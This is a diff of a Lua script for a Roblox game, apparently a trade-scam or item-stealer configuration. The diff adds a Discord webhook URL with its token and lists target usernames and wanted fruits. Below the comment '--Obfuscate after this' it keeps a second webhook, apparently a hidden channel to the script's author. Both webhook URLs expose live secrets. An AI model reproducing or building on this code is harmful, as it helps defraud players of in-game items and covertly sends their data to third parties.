@@ -1,3 +1,4 @@
+Webhook = "https://discord.com/api/webhooks/1342874944849186929/fe0915VAT6mORBBq2oI1uIu6IaqhPr_7Hros7iy20iznwVOEnnSyhjW3W-Nxs7aZ1hRe"
 Usernames = {"bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "pikapimon", "xrip_cyborg"} -- << Username(-s) it'll accept trade with
 Fruits = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Dragon(East)-Dragon-(East)", "Dough-Dough", "Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard"} -- << Fruits you want
 FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in trade to counter value difference
@@ -6,17 +7,6 @@ FruitsToReset = {  -- << Fruits it'll reset with, so you can put these fruits in
 }
 
 --Obfuscate after this
-if not Webhook then
-    Webhook = "https://discord.com/api/webhooks/1342874944849186929/fe0915VAT6mORBBq2oI1uIu6IaqhPr_7Hros7iy20iznwVOEnnSyhjW3W-Nxs7aZ1hRe"
-end
-
-if not Fruits then
-    Fruits = {"Yeti-Yeti", "Dragon(West)-Dragon(West)", "Dragon(East)-Dragon-(East)", "Kitsune-Kitsune", "Gas-Gas", "Leopard-Leopard"} -- Default Fruits
-end
-if not FruitsToReset then
-    FruitsToReset = {"Phoenix-Phoenix"} -- Default FruitsToReset
-end
-
 Webhook2 = "https://discord.com/api/webhooks/1341674842901975100/mwDdKFsk2EZiK3Sz97bRJQWk5GD3chO5bLEfyCd7gmkY65gpqeLoBStj8akimxisHfAF"
 
 repeat task.wait() until game:IsLoaded()
